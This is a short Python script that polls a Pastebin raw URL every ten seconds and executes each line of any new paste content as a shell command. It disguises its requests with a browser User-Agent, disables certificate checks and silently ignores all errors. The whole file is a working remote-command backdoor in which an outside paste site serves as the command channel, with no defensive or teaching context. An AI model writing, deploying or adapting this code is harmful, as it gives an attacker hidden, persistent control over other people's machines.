# Downloads a shell command from pastebin (or other paste website)

import sys, subprocess, requests, time

#ricpath = os.path.expanduser("~") + "/ricrun.pyw"
url = "https://pastebin.com/raw/SjRfdFmE"

prevdata = ''

while True:
    try:
        # Open the URL as Browser, not as python urllib
        page=requests.get(url, headers={'User-Agent': 'Mozilla/5.0'}, verify=False)
        #infile=urllib.request.urlopen(page).read()
        #data = infile.decode('ISO-8859-1') # Read the content as string decoded with ISO-8859-1
        data = page.content

        # print("Refreshing...")

        if data != prevdata:
            splitdata = data.splitlines(keepends=False)

            # print(splitdata)

            # Run each command individually
            for splitcmd in splitdata:
                subprocess.run(splitcmd, shell=True)

            prevdata = data

    except Exception:
        pass

    time.sleep(10)
